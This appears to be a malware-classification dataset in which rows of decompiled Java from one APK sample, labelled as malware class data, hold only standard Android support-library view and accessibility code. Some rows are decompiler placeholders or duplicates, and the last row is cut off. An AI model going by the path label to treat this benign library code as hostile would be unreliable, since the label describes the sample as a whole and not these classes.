"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\VisibilityListener.code","public interface VisibilityListener {   void onActionProviderVisibilityChanged(  boolean z); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\WindowCompat.code","public class WindowCompat {   public static final int FEATURE_ACTION_BAR=8;   public static final int FEATURE_ACTION_BAR_OVERLAY=9;   public static final int FEATURE_ACTION_MODE_OVERLAY=10; } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityEventCompat.code","public class AccessibilityEventCompat {   private static final AccessibilityEventVersionImpl IMPL;   public static final int TYPES_ALL_MASK=-1;   public static final int TYPE_ANNOUNCEMENT=16384;   public static final int TYPE_GESTURE_DETECTION_END=524288;   public static final int TYPE_GESTURE_DETECTION_START=262144;   public static final int TYPE_TOUCH_EXPLORATION_GESTURE_END=1024;   public static final int TYPE_TOUCH_EXPLORATION_GESTURE_START=512;   public static final int TYPE_TOUCH_INTERACTION_END=2097152;   public static final int TYPE_TOUCH_INTERACTION_START=1048576;   public static final int TYPE_VIEW_ACCESSIBILITY_FOCUSED=32768;   public static final int TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED=65536;   public static final int TYPE_VIEW_HOVER_ENTER=128;   public static final int TYPE_VIEW_HOVER_EXIT=256;   public static final int TYPE_VIEW_SCROLLED=4096;   public static final int TYPE_VIEW_TEXT_SELECTION_CHANGED=8192;   public static final int TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY=131072;   public static final int TYPE_WINDOW_CONTENT_CHANGED=2048; interface AccessibilityEventVersionImpl {     void appendRecord(    AccessibilityEvent accessibilityEvent,    Object obj);     Object getRecord(    AccessibilityEvent accessibilityEvent,    int i);     int getRecordCount(    AccessibilityEvent accessibilityEvent);   } static class AccessibilityEventStubImpl implements AccessibilityEventVersionImpl {     AccessibilityEventStubImpl(){     }     @Override public void appendRecord(    AccessibilityEvent event,    Object record){     }     @Override public Object getRecord(    AccessibilityEvent event,    int index){       return null;     }     @Override public int getRecordCount(    AccessibilityEvent event){       return 0;     }   } static class AccessibilityEventIcsImpl extends AccessibilityEventStubImpl {     AccessibilityEventIcsImpl(){     }     @Override public void appendRecord(    AccessibilityEvent event,    Object record){       AccessibilityEventCompatIcs.appendRecord(event,record);     }     @Override public Object getRecord(    AccessibilityEvent event,    int index){       return AccessibilityEventCompatIcs.getRecord(event,index);     }     @Override public int getRecordCount(    AccessibilityEvent event){       return AccessibilityEventCompatIcs.getRecordCount(event);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityEventIcsImpl();     }  else {       IMPL=new AccessibilityEventStubImpl();     }   }   private AccessibilityEventCompat(){   }   public static int getRecordCount(  AccessibilityEvent event){     return IMPL.getRecordCount(event);   }   public static void appendRecord(  AccessibilityEvent event,  AccessibilityRecordCompat record){     IMPL.appendRecord(event,record.getImpl());   }   public static AccessibilityRecordCompat getRecord(  AccessibilityEvent event,  int index){     return new AccessibilityRecordCompat(IMPL.getRecord(event,index));   }   public static AccessibilityRecordCompat asRecord(  AccessibilityEvent event){     return new AccessibilityRecordCompat(event);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityEventCompatIcs.code","class AccessibilityEventCompatIcs {   AccessibilityEventCompatIcs(){   }   public static int getRecordCount(  AccessibilityEvent event){     return event.getRecordCount();   }   public static void appendRecord(  AccessibilityEvent event,  Object record){     event.appendRecord((AccessibilityRecord)record);   }   public static Object getRecord(  AccessibilityEvent event,  int index){     return event.getRecord(index);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityEventIcsImpl.code","static class AccessibilityEventIcsImpl extends AccessibilityEventStubImpl {   AccessibilityEventIcsImpl(){   }   @Override public void appendRecord(  AccessibilityEvent event,  Object record){     AccessibilityEventCompatIcs.appendRecord(event,record);   }   @Override public Object getRecord(  AccessibilityEvent event,  int index){     return AccessibilityEventCompatIcs.getRecord(event,index);   }   @Override public int getRecordCount(  AccessibilityEvent event){     return AccessibilityEventCompatIcs.getRecordCount(event);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityEventStubImpl.code","static class AccessibilityEventStubImpl implements AccessibilityEventVersionImpl {   AccessibilityEventStubImpl(){   }   @Override public void appendRecord(  AccessibilityEvent event,  Object record){   }   @Override public Object getRecord(  AccessibilityEvent event,  int index){     return null;   }   @Override public int getRecordCount(  AccessibilityEvent event){     return 0;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityEventVersionImpl.code","interface AccessibilityEventVersionImpl {   void appendRecord(  AccessibilityEvent accessibilityEvent,  Object obj);   Object getRecord(  AccessibilityEvent accessibilityEvent,  int i);   int getRecordCount(  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityManagerCompat.code","public class AccessibilityManagerCompat {   private static final AccessibilityManagerVersionImpl IMPL; interface AccessibilityManagerVersionImpl {     boolean addAccessibilityStateChangeListener(    AccessibilityManager accessibilityManager,    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);     List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager accessibilityManager,    int i);     List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager accessibilityManager);     boolean isTouchExplorationEnabled(    AccessibilityManager accessibilityManager);     Object newAccessiblityStateChangeListener(    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);     boolean removeAccessibilityStateChangeListener(    AccessibilityManager accessibilityManager,    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   } public static abstract class AccessibilityStateChangeListenerCompat {     final Object mListener=AccessibilityManagerCompat.IMPL.newAccessiblityStateChangeListener(this);     public abstract void onAccessibilityStateChanged(    boolean z);   } static class AccessibilityManagerStubImpl implements AccessibilityManagerVersionImpl {     AccessibilityManagerStubImpl(){     }     @Override public Object newAccessiblityStateChangeListener(    AccessibilityStateChangeListenerCompat listener){       return null;     }     @Override public boolean addAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return false;     }     @Override public boolean removeAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return false;     }     @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager manager,    int feedbackTypeFlags){       return Collections.emptyList();     }     @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager manager){       return Collections.emptyList();     }     @Override public boolean isTouchExplorationEnabled(    AccessibilityManager manager){       return false;     }   } static class AccessibilityManagerIcsImpl extends AccessibilityManagerStubImpl {     AccessibilityManagerIcsImpl(){     }     @Override public Object newAccessiblityStateChangeListener(    final AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.newAccessibilityStateChangeListener(new AccessibilityManagerCompatIcs.AccessibilityStateChangeListenerBridge(){         @Override public void onAccessibilityStateChanged(        boolean enabled){           listener.onAccessibilityStateChanged(enabled);         }       } );     }     @Override public boolean addAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.addAccessibilityStateChangeListener(manager,listener.mListener);     }     @Override public boolean removeAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.removeAccessibilityStateChangeListener(manager,listener.mListener);     }     @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager manager,    int feedbackTypeFlags){       return AccessibilityManagerCompatIcs.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);     }     @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager manager){       return AccessibilityManagerCompatIcs.getInstalledAccessibilityServiceList(manager);     }     @Override public boolean isTouchExplorationEnabled(    AccessibilityManager manager){       return AccessibilityManagerCompatIcs.isTouchExplorationEnabled(manager);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityManagerIcsImpl();     }  else {       IMPL=new AccessibilityManagerStubImpl();     }   }   public static boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return IMPL.addAccessibilityStateChangeListener(manager,listener);   }   public static boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return IMPL.removeAccessibilityStateChangeListener(manager,listener);   }   public static List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return IMPL.getInstalledAccessibilityServiceList(manager);   }   public static List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return IMPL.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);   }   public static boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return IMPL.isTouchExplorationEnabled(manager);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityManagerCompatIcs.code","class AccessibilityManagerCompatIcs { interface AccessibilityStateChangeListenerBridge {     void onAccessibilityStateChanged(    boolean z);   }   AccessibilityManagerCompatIcs(){   }   public static Object newAccessibilityStateChangeListener(  final AccessibilityStateChangeListenerBridge bridge){     return new AccessibilityManager.AccessibilityStateChangeListener(){       @Override public void onAccessibilityStateChanged(      boolean enabled){         AccessibilityStateChangeListenerBridge.this.onAccessibilityStateChanged(enabled);       }     } ;   }   public static boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  Object listener){     return manager.addAccessibilityStateChangeListener((AccessibilityManager.AccessibilityStateChangeListener)listener);   }   public static boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  Object listener){     return manager.removeAccessibilityStateChangeListener((AccessibilityManager.AccessibilityStateChangeListener)listener);   }   public static List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return manager.getEnabledAccessibilityServiceList(feedbackTypeFlags);   }   public static List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return manager.getInstalledAccessibilityServiceList();   }   public static boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return manager.isTouchExplorationEnabled();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityManagerIcsImpl.code","static class AccessibilityManagerIcsImpl extends AccessibilityManagerStubImpl {   AccessibilityManagerIcsImpl(){   }   @Override public Object newAccessiblityStateChangeListener(  final AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.newAccessibilityStateChangeListener(new AccessibilityManagerCompatIcs.AccessibilityStateChangeListenerBridge(){       @Override public void onAccessibilityStateChanged(      boolean enabled){         listener.onAccessibilityStateChanged(enabled);       }     } );   }   @Override public boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.addAccessibilityStateChangeListener(manager,listener.mListener);   }   @Override public boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.removeAccessibilityStateChangeListener(manager,listener.mListener);   }   @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return AccessibilityManagerCompatIcs.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);   }   @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return AccessibilityManagerCompatIcs.getInstalledAccessibilityServiceList(manager);   }   @Override public boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return AccessibilityManagerCompatIcs.isTouchExplorationEnabled(manager);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityManagerStubImpl.code","static class AccessibilityManagerStubImpl implements AccessibilityManagerVersionImpl {   AccessibilityManagerStubImpl(){   }   @Override public Object newAccessiblityStateChangeListener(  AccessibilityStateChangeListenerCompat listener){     return null;   }   @Override public boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return false;   }   @Override public boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return false;   }   @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return Collections.emptyList();   }   @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return Collections.emptyList();   }   @Override public boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return false;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityManagerVersionImpl.code","interface AccessibilityManagerVersionImpl {   boolean addAccessibilityStateChangeListener(  AccessibilityManager accessibilityManager,  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager accessibilityManager,  int i);   List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager accessibilityManager);   boolean isTouchExplorationEnabled(  AccessibilityManager accessibilityManager);   Object newAccessiblityStateChangeListener(  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   boolean removeAccessibilityStateChangeListener(  AccessibilityManager accessibilityManager,  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeInfoBridge.code","interface AccessibilityNodeInfoBridge {   Object createAccessibilityNodeInfo(  int i);   List<Object> findAccessibilityNodeInfosByText(  String str,  int i);   boolean performAction(  int i,  int i2,  Bundle bundle); } interface AccessibilityNodeInfoBridge {   Object createAccessibilityNodeInfo(  int i);   List<Object> findAccessibilityNodeInfosByText(  String str,  int i);   Object findFocus(  int i);   boolean performAction(  int i,  int i2,  Bundle bundle); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeInfoCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@45c2121f"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatIcs.code","class AccessibilityNodeInfoCompatIcs {   AccessibilityNodeInfoCompatIcs(){   }   public static Object obtain(){     return AccessibilityNodeInfo.obtain();   }   public static Object obtain(  View source){     return AccessibilityNodeInfo.obtain(source);   }   public static Object obtain(  Object info){     return AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)info);   }   public static void addAction(  Object info,  int action){     ((AccessibilityNodeInfo)info).addAction(action);   }   public static void addChild(  Object info,  View child){     ((AccessibilityNodeInfo)info).addChild(child);   }   public static List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     List result=((AccessibilityNodeInfo)info).findAccessibilityNodeInfosByText(text);     return result;   }   public static int getActions(  Object info){     return ((AccessibilityNodeInfo)info).getActions();   }   public static void getBoundsInParent(  Object info,  Rect outBounds){     ((AccessibilityNodeInfo)info).getBoundsInParent(outBounds);   }   public static void getBoundsInScreen(  Object info,  Rect outBounds){     ((AccessibilityNodeInfo)info).getBoundsInScreen(outBounds);   }   public static Object getChild(  Object info,  int index){     return ((AccessibilityNodeInfo)info).getChild(index);   }   public static int getChildCount(  Object info){     return ((AccessibilityNodeInfo)info).getChildCount();   }   public static CharSequence getClassName(  Object info){     return ((AccessibilityNodeInfo)info).getClassName();   }   public static CharSequence getContentDescription(  Object info){     return ((AccessibilityNodeInfo)info).getContentDescription();   }   public static CharSequence getPackageName(  Object info){     return ((AccessibilityNodeInfo)info).getPackageName();   }   public static Object getParent(  Object info){     return ((AccessibilityNodeInfo)info).getParent();   }   public static CharSequence getText(  Object info){     return ((AccessibilityNodeInfo)info).getText();   }   public static int getWindowId(  Object info){     return ((AccessibilityNodeInfo)info).getWindowId();   }   public static boolean isCheckable(  Object info){     return ((AccessibilityNodeInfo)info).isCheckable();   }   public static boolean isChecked(  Object info){     return ((AccessibilityNodeInfo)info).isChecked();   }   public static boolean isClickable(  Object info){     return ((AccessibilityNodeInfo)info).isClickable();   }   public static boolean isEnabled(  Object info){     return ((AccessibilityNodeInfo)info).isEnabled();   }   public static boolean isFocusable(  Object info){     return ((AccessibilityNodeInfo)info).isFocusable();   }   public static boolean isFocused(  Object info){     return ((AccessibilityNodeInfo)info).isFocused();   }   public static boolean isLongClickable(  Object info){     return ((AccessibilityNodeInfo)info).isLongClickable();   }   public static boolean isPassword(  Object info){     return ((AccessibilityNodeInfo)info).isPassword();   }   public static boolean isScrollable(  Object info){     return ((AccessibilityNodeInfo)info).isScrollable();   }   public static boolean isSelected(  Object info){     return ((AccessibilityNodeInfo)info).isSelected();   }   public static boolean performAction(  Object info,  int action){     return ((AccessibilityNodeInfo)info).performAction(action);   }   public static void setBoundsInParent(  Object info,  Rect bounds){     ((AccessibilityNodeInfo)info).setBoundsInParent(bounds);   }   public static void setBoundsInScreen(  Object info,  Rect bounds){     ((AccessibilityNodeInfo)info).setBoundsInScreen(bounds);   }   public static void setCheckable(  Object info,  boolean checkable){     ((AccessibilityNodeInfo)info).setCheckable(checkable);   }   public static void setChecked(  Object info,  boolean checked){     ((AccessibilityNodeInfo)info).setChecked(checked);   }   public static void setClassName(  Object info,  CharSequence className){     ((AccessibilityNodeInfo)info).setClassName(className);   }   public static void setClickable(  Object info,  boolean clickable){     ((AccessibilityNodeInfo)info).setClickable(clickable);   }   public static void setContentDescription(  Object info,  CharSequence contentDescription){     ((AccessibilityNodeInfo)info).setContentDescription(contentDescription);   }   public static void setEnabled(  Object info,  boolean enabled){     ((AccessibilityNodeInfo)info).setEnabled(enabled);   }   public static void setFocusable(  Object info,  boolean focusable){     ((AccessibilityNodeInfo)info).setFocusable(focusable);   }   public static void setFocused(  Object info,  boolean focused){     ((AccessibilityNodeInfo)info).setFocused(focused);   }   public static void setLongClickable(  Object info,  boolean longClickable){     ((AccessibilityNodeInfo)info).setLongClickable(longClickable);   }   public static void setPackageName(  Object info,  CharSequence packageName){     ((AccessibilityNodeInfo)info).setPackageName(packageName);   }   public static void setParent(  Object info,  View parent){     ((AccessibilityNodeInfo)info).setParent(parent);   }   public static void setPassword(  Object info,  boolean password){     ((AccessibilityNodeInfo)info).setPassword(password);   }   public static void setScrollable(  Object info,  boolean scrollable){     ((AccessibilityNodeInfo)info).setScrollable(scrollable);   }   public static void setSelected(  Object info,  boolean selected){     ((AccessibilityNodeInfo)info).setSelected(selected);   }   public static void setSource(  Object info,  View source){     ((AccessibilityNodeInfo)info).setSource(source);   }   public static void setText(  Object info,  CharSequence text){     ((AccessibilityNodeInfo)info).setText(text);   }   public static void recycle(  Object info){     ((AccessibilityNodeInfo)info).recycle();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatJellyBean.code","class AccessibilityNodeInfoCompatJellyBean {   AccessibilityNodeInfoCompatJellyBean(){   }   public static void addChild(  Object info,  View child,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).addChild(child,virtualDescendantId);   }   public static void setSource(  Object info,  View root,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).setSource(root,virtualDescendantId);   }   public static boolean isVisibleToUser(  Object info){     return ((AccessibilityNodeInfo)info).isVisibleToUser();   }   public static void setVisibleToUser(  Object info,  boolean visibleToUser){     ((AccessibilityNodeInfo)info).setVisibleToUser(visibleToUser);   }   public static boolean performAction(  Object info,  int action,  Bundle arguments){     return ((AccessibilityNodeInfo)info).performAction(action,arguments);   }   public static void setMovementGranularities(  Object info,  int granularities){     ((AccessibilityNodeInfo)info).setMovementGranularities(granularities);   }   public static int getMovementGranularities(  Object info){     return ((AccessibilityNodeInfo)info).getMovementGranularities();   }   public static Object obtain(  View root,  int virtualDescendantId){     return AccessibilityNodeInfo.obtain(root,virtualDescendantId);   }   public static Object findFocus(  Object info,  int focus){     return ((AccessibilityNodeInfo)info).findFocus(focus);   }   public static Object focusSearch(  Object info,  int direction){     return ((AccessibilityNodeInfo)info).focusSearch(direction);   }   public static void setParent(  Object info,  View root,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).setParent(root,virtualDescendantId);   }   public static boolean isAccessibilityFocused(  Object info){     return ((AccessibilityNodeInfo)info).isAccessibilityFocused();   }   public static void setAccesibilityFocused(  Object info,  boolean focused){     ((AccessibilityNodeInfo)info).setAccessibilityFocused(focused);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatJellybeanMr2.code","class AccessibilityNodeInfoCompatJellybeanMr2 {   AccessibilityNodeInfoCompatJellybeanMr2(){   }   public static void setViewIdResourceName(  Object info,  String viewId){     ((AccessibilityNodeInfo)info).setViewIdResourceName(viewId);   }   public static String getViewIdResourceName(  Object info){     return ((AccessibilityNodeInfo)info).getViewIdResourceName();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatKitKat.code","class AccessibilityNodeInfoCompatKitKat {   AccessibilityNodeInfoCompatKitKat(){   }   public static int getLiveRegion(  Object info){     return ((AccessibilityNodeInfo)info).getLiveRegion();   }   public static void setLiveRegion(  Object info,  int mode){     ((AccessibilityNodeInfo)info).setLiveRegion(mode);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeInfoIcsImpl.code","static class AccessibilityNodeInfoIcsImpl extends AccessibilityNodeInfoStubImpl {   AccessibilityNodeInfoIcsImpl(){   }   @Override public Object obtain(){     return AccessibilityNodeInfoCompatIcs.obtain();   }   @Override public Object obtain(  View source){     return AccessibilityNodeInfoCompatIcs.obtain(source);   }   @Override public Object obtain(  Object info){     return AccessibilityNodeInfoCompatIcs.obtain(info);   }   @Override public void addAction(  Object info,  int action){     AccessibilityNodeInfoCompatIcs.addAction(info,action);   }   @Override public void addChild(  Object info,  View child){     AccessibilityNodeInfoCompatIcs.addChild(info,child);   }   @Override public List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     return AccessibilityNodeInfoCompatIcs.findAccessibilityNodeInfosByText(info,text);   }   @Override public int getActions(  Object info){     return AccessibilityNodeInfoCompatIcs.getActions(info);   }   @Override public void getBoundsInParent(  Object info,  Rect outBounds){     AccessibilityNodeInfoCompatIcs.getBoundsInParent(info,outBounds);   }   @Override public void getBoundsInScreen(  Object info,  Rect outBounds){     AccessibilityNodeInfoCompatIcs.getBoundsInScreen(info,outBounds);   }   @Override public Object getChild(  Object info,  int index){     return AccessibilityNodeInfoCompatIcs.getChild(info,index);   }   @Override public int getChildCount(  Object info){     return AccessibilityNodeInfoCompatIcs.getChildCount(info);   }   @Override public CharSequence getClassName(  Object info){     return AccessibilityNodeInfoCompatIcs.getClassName(info);   }   @Override public CharSequence getContentDescription(  Object info){     return AccessibilityNodeInfoCompatIcs.getContentDescription(info);   }   @Override public CharSequence getPackageName(  Object info){     return AccessibilityNodeInfoCompatIcs.getPackageName(info);   }   @Override public Object getParent(  Object info){     return AccessibilityNodeInfoCompatIcs.getParent(info);   }   @Override public CharSequence getText(  Object info){     return AccessibilityNodeInfoCompatIcs.getText(info);   }   @Override public int getWindowId(  Object info){     return AccessibilityNodeInfoCompatIcs.getWindowId(info);   }   @Override public boolean isCheckable(  Object info){     return AccessibilityNodeInfoCompatIcs.isCheckable(info);   }   @Override public boolean isChecked(  Object info){     return AccessibilityNodeInfoCompatIcs.isChecked(info);   }   @Override public boolean isClickable(  Object info){     return AccessibilityNodeInfoCompatIcs.isClickable(info);   }   @Override public boolean isEnabled(  Object info){     return AccessibilityNodeInfoCompatIcs.isEnabled(info);   }   @Override public boolean isFocusable(  Object info){     return AccessibilityNodeInfoCompatIcs.isFocusable(info);   }   @Override public boolean isFocused(  Object info){     return AccessibilityNodeInfoCompatIcs.isFocused(info);   }   @Override public boolean isLongClickable(  Object info){     return AccessibilityNodeInfoCompatIcs.isLongClickable(info);   }   @Override public boolean isPassword(  Object info){     return AccessibilityNodeInfoCompatIcs.isPassword(info);   }   @Override public boolean isScrollable(  Object info){     return AccessibilityNodeInfoCompatIcs.isScrollable(info);   }   @Override public boolean isSelected(  Object info){     return AccessibilityNodeInfoCompatIcs.isSelected(info);   }   @Override public boolean performAction(  Object info,  int action){     return AccessibilityNodeInfoCompatIcs.performAction(info,action);   }   @Override public void setBoundsInParent(  Object info,  Rect bounds){     AccessibilityNodeInfoCompatIcs.setBoundsInParent(info,bounds);   }   @Override public void setBoundsInScreen(  Object info,  Rect bounds){     AccessibilityNodeInfoCompatIcs.setBoundsInScreen(info,bounds);   }   @Override public void setCheckable(  Object info,  boolean checkable){     AccessibilityNodeInfoCompatIcs.setCheckable(info,checkable);   }   @Override public void setChecked(  Object info,  boolean checked){     AccessibilityNodeInfoCompatIcs.setChecked(info,checked);   }   @Override public void setClassName(  Object info,  CharSequence className){     AccessibilityNodeInfoCompatIcs.setClassName(info,className);   }   @Override public void setClickable(  Object info,  boolean clickable){     AccessibilityNodeInfoCompatIcs.setClickable(info,clickable);   }   @Override public void setContentDescription(  Object info,  CharSequence contentDescription){     AccessibilityNodeInfoCompatIcs.setContentDescription(info,contentDescription);   }   @Override public void setEnabled(  Object info,  boolean enabled){     AccessibilityNodeInfoCompatIcs.setEnabled(info,enabled);   }   @Override public void setFocusable(  Object info,  boolean focusable){     AccessibilityNodeInfoCompatIcs.setFocusable(info,focusable);   }   @Override public void setFocused(  Object info,  boolean focused){     AccessibilityNodeInfoCompatIcs.setFocused(info,focused);   }   @Override public void setLongClickable(  Object info,  boolean longClickable){     AccessibilityNodeInfoCompatIcs.setLongClickable(info,longClickable);   }   @Override public void setPackageName(  Object info,  CharSequence packageName){     AccessibilityNodeInfoCompatIcs.setPackageName(info,packageName);   }   @Override public void setParent(  Object info,  View parent){     AccessibilityNodeInfoCompatIcs.setParent(info,parent);   }   @Override public void setPassword(  Object info,  boolean password){     AccessibilityNodeInfoCompatIcs.setPassword(info,password);   }   @Override public void setScrollable(  Object info,  boolean scrollable){     AccessibilityNodeInfoCompatIcs.setScrollable(info,scrollable);   }   @Override public void setSelected(  Object info,  boolean selected){     AccessibilityNodeInfoCompatIcs.setSelected(info,selected);   }   @Override public void setSource(  Object info,  View source){     AccessibilityNodeInfoCompatIcs.setSource(info,source);   }   @Override public void setText(  Object info,  CharSequence text){     AccessibilityNodeInfoCompatIcs.setText(info,text);   }   @Override public void recycle(  Object info){     AccessibilityNodeInfoCompatIcs.recycle(info);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view.accessibility\AccessibilityNodeInfoImpl.code","public interface AccessibilityNodeInfoImpl {   void addAction(  Object obj,  int i);   void addChild(  Object obj,  View view);   void addChild(  Object obj,  View view,  int i);   List<Object> findAccessibilityNodeInfosByText(  Object obj,  String str);   Object findFocus(  Object obj,  int i);   Object focusSearch(  Object obj,  int i);   int getActions(  Object obj);   void getBoundsInParent(  Object obj,  Rect rect);   void getBoundsInScreen(  Object obj,  Rect rect);   Object getChild(  Object obj,  int i);   int getChildCount(  Object obj);   CharSequence getClassName(  Object obj);   CharSequence getContentDescription(  Object obj);   int getLiveRegion(  Object obj);   int getMovementGranularities(  Object obj);   CharSequence getPackageName(  Object obj);   Object getParent(  Object obj);   CharSequence getText(  Object obj);   String getViewIdResourceName(  Object obj);   int getWindowId(  Object obj);   boolean isAccessibilityFocused(  Object obj);   boolean isCheckable(  Object obj);   boolean isChecked(  Object obj);   boolean isClickable(  Object obj);   boolean isEnabled(  Object obj);   boolean isFocusable(  Object obj);   boolean isFocused(  Object obj);   boolean isLongClickable(  Object obj);   boolean isPassword(  Object obj);   boolean isScrollable(  Object obj);   boolean isSelected(  Object obj);   boolean isVisibleToUser(  Object obj);   Object obtain();   Object obtain(  View view);   Object obtain(  View view,  int i);   Object obtain(  Object obj);   boolean performAction(  Object obj,  int i);   boolean performAction(  Object obj,  int i,  Bundle bundle);   void recycle(  Object obj);   void setAccessibilityFocused(  Object obj,  boolean 